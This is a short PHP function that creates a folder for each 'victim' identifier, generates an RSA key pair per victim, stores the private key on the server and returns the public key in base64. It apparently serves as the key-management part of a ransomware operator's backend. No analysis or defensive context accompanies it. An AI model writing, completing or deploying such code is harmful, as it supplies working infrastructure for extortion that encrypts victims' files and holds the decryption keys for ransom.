<?php

function key_generate($victim_id){
    $victims_dir=__DIR__."/victims/";

    $folder = $victims_dir.'__george_rr_martin_'.md5($victim_id);

	$config = array(
		"digest_alg" => "sha512",
		"private_key_bits" => 2048,
		"private_key_type" => OPENSSL_KEYTYPE_RSA,

	);


	$res = openssl_pkey_new($config);

	openssl_pkey_export($res, $privkey, NULL, $config);

	$privkey_file = $folder.'/'.$victim_id.".pem";
    $privkf = fopen($privkey_file, 'w');
    fwrite($privkf, $privkey);
    fclose($privkf);
	
    $pubkey = openssl_pkey_get_details($res);
	$pubkey = $pubkey['key'];
   
    $pubkey_file = $folder.'/'.$victim_id.".pub";
    $pubkf = fopen($pubkey_file, 'w');
    fwrite($pubkf, $pubkey);
    fclose($pubkf);
    
    return base64_encode($pubkey);
}

?>